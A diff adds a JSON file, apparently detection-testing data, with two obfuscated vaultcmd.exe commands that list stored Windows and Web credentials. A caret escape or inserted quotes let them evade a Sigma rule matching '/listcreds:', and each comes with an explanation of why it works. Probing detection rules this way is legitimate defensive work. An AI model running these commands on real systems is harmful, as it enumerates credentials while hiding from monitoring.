@@ -1,0 +1,10 @@
+[
+  {
+    "output": "vaultcmd.exe /listcreds^:\"Windows Credentials\"",
+    "explanation": "This command bypasses the detection by utilizing the Windows command prompt escape character '^' (caret). The Sigma rule specifically looks for the exact string '/listcreds:' in the CommandLine field. Inserting a caret breaks the literal string match (the logged command line will be recorded with the caret), but cmd.exe ignores the caret during execution, allowing vaultcmd.exe to process the argument normally. This highlights the fragility of static string matching in detection rules."
+  },
+  {
+    "output": "vaultcmd.exe /list\"c\"reds:\"Web Credentials\"",
+    "explanation": "Similar to the caret technique, placing quotes within the argument name obfuscates the command line string. The executable will often still parse the argument correctly, but the SIEM log will capture '/list\"c\"reds:', evading the 'CommandLine|contains: \\'/listcreds:\\'' logic."
+  }
+]
